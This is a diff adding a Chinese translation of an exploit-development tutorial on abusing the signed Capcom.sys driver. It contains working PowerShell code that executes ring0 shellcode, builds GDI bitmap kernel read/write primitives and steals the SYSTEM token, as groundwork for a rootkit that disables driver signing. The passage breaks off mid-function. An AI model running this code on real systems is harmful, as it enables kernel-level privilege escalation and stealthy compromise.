@@ -1,0 +1,115 @@
+最近看了一篇关于恶意软件Derusbi分析的[文章](http://www.sekoia.fr/blog/windows-driver-signing-bypass-by-derusbi/)，该文章的技术亮点就是利用已签名驱动的漏洞来加载未签名驱动。文中利用[CVE-2013-3956](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3956)漏洞来翻转驱动签名的效验位，这样恶意软件就可以随意加载其他驱动，然后Derusbi加载了NDIS驱动程序，这样就可以进行流量嗅探（我没有研究具体细节）。
+然而出于好奇，我觉得实现相同功能的POC将会非常困难（事实证明并非如此）。为了完全实现上述漏洞利用技术，我决定利用[@TheWack0lian](https://twitter.com/TheWack0lian/status/779397840762245124)于2016年[9](https://twitter.com/TheWack0lian/status/779397840762245124)月23日公布的签名驱动程序Capcom.sys中的漏洞来实现这一技术。好了，不再罗嗦了，直接操刀实战。
+### 驱动漏洞
+本文目的并非进行驱动漏洞分析，强烈建议先去看看如下[@TheColonial](https://twitter.com/TheColonial)
+针对Capcom.sys驱动的攻击分析视频，这样会对该驱动的漏洞机理有一个清晰的认识，能在大脑里形成一个漏洞攻击利用过程的画面，将有助于对本文的理解。
+基本上，就是把执行ring0
+代码作为一个服务！它唯一的功能就是获取用户地址指针，然后禁用[SMEP](http://j00ru.vexillium.org/?p=783)，然后在用户指针地址处执行代码，然后再恢复SMEP。该驱动漏洞利用过程的反汇编代码如下：
+如下Power Shell POC实现了这个驱动漏洞的利用过程：
+    \# => cmp [rax-8], rcx
+    echo "`n[>] Allocating Capcom payload.."
+    [IntPtr]$Pointer = [CapCom]::VirtualAlloc([System.IntPtr]::Zero, (8 + $Shellcode.Length), 0x3000, 0x40)
+    $ExploitBuffer = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8) + $Shellcode
+    [System.Runtime.InteropServices.Marshal]::Copy($ExploitBuffer, 0, $Pointer, (8 + $Shellcode.Length))
+    echo "[+] Payload size: $(8 + $Shellcode.Length)"
+    echo "[+] Payload address: $("{0:X}" -f $Pointer.ToInt64())"
+    $hDevice = [CapCom]::CreateFile("\\.\Htsysm72FB", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+    if ($hDevice -eq -1) {
+        echo "`n[!] Unable to get driver handle..`n"
+        Return
+    } else {
+        echo "`n[>] Driver information.."
+        echo "[+] lpFileName: \\.\Htsysm72FB"
+        echo "[+] Handle: $hDevice"
+    }
+    \# IOCTL = 0xAA013044
+    \#---    
+    $InBuff = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8)
+    $OutBuff = 0x1234
+    echo "`n[>] Sending buffer.."
+    echo "[+] Buffer length: $($InBuff.Length)"
+    echo "[+] IOCTL: 0xAA013044"
+    [CapCom]::DeviceIoControl($hDevice, 0xAA013044, $InBuff, $InBuff.Length, [ref]$OutBuff, 4, [ref]0, [System.IntPtr]::Zero) |Out-null
+有了执行Shellcode的能力后，我选择构造一个原始GDI位图结构，它可以使我能够持续地读写内核，而不用重复地加载驱动。我通过 [Stage-gSharedInfoBitmap](https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Stage-gSharedInfoBitmap.ps1) 来创建位图，并以下列方式设置Shellcode：
+    \# Leak BitMap pointers
+    echo "`n[>] gSharedInfo bitmap leak.."
+    $Manager = Stage-gSharedInfoBitmap
+    $Worker = Stage-gSharedInfoBitmap
+    echo "[+] Manager bitmap Kernel address: 0x$("{0:X16}" -f $($Manager.BitmapKernelObj))"
+    echo "[+] Worker bitmap Kernel address: 0x$("{0:X16}" -f $($Worker.BitmapKernelObj))"
+    \# Shellcode buffer
+    [Byte[]] $Shellcode = @(
+        0x48, 0xB8) + [System.BitConverter]::GetBytes($Manager.BitmappvScan0) + @( # mov rax,$Manager.BitmappvScan0
+        0x48, 0xB9) + [System.BitConverter]::GetBytes($Worker.BitmappvScan0)  + @( # mov rcx,$Manager.BitmappvScan0
+        0x48,0x89,0x08,                                                   # mov qword ptr [rax],rcx
+        0xC3                 # ret
+    )
+想进一步了解该技术的实现细节，可以参考我之前以ID[@mwrlabs](https://twitter.com/mwrlabs)发表的文章 [A Tale
+Of Bitmaps: Leaking GDI Objects Post Windows 10 Anniversary
+Edition](https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/)以及《我的WINDOWS
+攻击之旅》系列的[第17篇](http://www.fuzzysecurity.com/tutorials/expDev/21.html)。
+### Rootkit 功能
+有了对内核的读写能力之后，我们就可以开始实现我们的Rootkit的功能了。对此，我决定专注于实现以下两个不同功能：
+（1）将任意PID提升为SYSTEM;
+（2）在运行时禁用驱动程序签名保护，将非签名代码加载到内核中。
+### 任意进程权限提升
+一般来说，我们需要遍历EPROCESS结构的链表，然后复制SYSTEM
+EPROCESS令牌字段，并使用此值覆盖掉目标EPROCESS结构的令牌字段。在没有其他更好的漏洞利用的情况下，我们只有通过用户空间来泄露 System
+(PID 4) EPROCESS 结构的指针：
+需要注意的是，从WIN8.1之后需要具有普通权限，才可以通过“SystemModuleInformation”来泄漏当前加载的NT内核的基址。我们可以在PowerShell中使用[Get-LoadedModules](https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Get-LoadedModules.ps1)轻松实现此过程，并在KD中验证我们的结果。
+非常棒，现在我们找到了一个方法来获得System EPROCESS 结构指针，同时我们可以通过构造的位图结构来读取SYSTEM token
+。最后需要做的就是根据 "ActiveProcessLinks" 链来找到我们需要提升权限的进程的 EPROCESS结构。在x64
+Win10平台，此链表结构如下：
+该链表是一个双向循环链表，那么我们可以通过读取EPROCESS
+结构，然后判断PID是否为目标进程，如果是则覆盖该进程Token，否则继续遍历直到获得目标进程的EPROCESS 结构。
+EPROCESS
+结构是非公开的，并且在不同的WIN操作系统上也不相同，但是我们可以通过维护一个静态的偏移列表来解决这个问题。在此强烈建议看一下由[@rwfpl](https://twitter.com/rwfpl)维护的一个工程
+[Terminus
+Project](http://terminus.rewolf.pl/terminus/)。下面的powershell函数实现了这个令牌窃取逻辑。
+    function Capcom-ElevatePID {
+        param ([Int]$ProcPID)
+        # Check our bitmaps have been staged into memory
+        if (!$ManagerBitmap -Or !$WorkerBitmap) {
+            Capcom-StageGDI
+            if ($DriverNotLoaded -eq $true) {
+                Return
+            }
+        }
+        # Defaults to elevating Powershell
+        if (!$ProcPID) {
+            $ProcPID = $PID
+        }
+        # Make sure the pid exists!
+        # 0 is also invalid but will default to $PID
+        $IsValidProc = ((Get-Process).Id).Contains($ProcPID)
+        if (!$IsValidProc) {
+            Write-Output "`n[!] Invalid process specified!`n"
+            Return
+        }
+        # _EPROCESS UniqueProcessId/Token/ActiveProcessLinks offsets based on OS
+        # WARNING offsets are invalid for Pre-RTM images!
+        $OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
+        $OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
+        switch ($OSMajorMinor)
+        {
+            '10.0' # Win10 / 2k16
+            {
+                $UniqueProcessIdOffset = 0x2e8
+                $TokenOffset = 0x358          
+                $ActiveProcessLinks = 0x2f0
+            }
+            '6.3' # Win8.1 / 2k12R2
+            {
+                $UniqueProcessIdOffset = 0x2e0
+                $TokenOffset = 0x348          
+                $ActiveProcessLinks = 0x2e8
+            }
+            '6.2' # Win8 / 2k12
+            {
+                $UniqueProcessIdOffset = 0x2e0
+                $TokenOffset = 0x348          
+                $ActiveProcessLinks = 0x2e8
+            }
+            '6.1' # Win7 / 2k8R2
+            {
+                $UniqueProcessIdOffset = 0x180
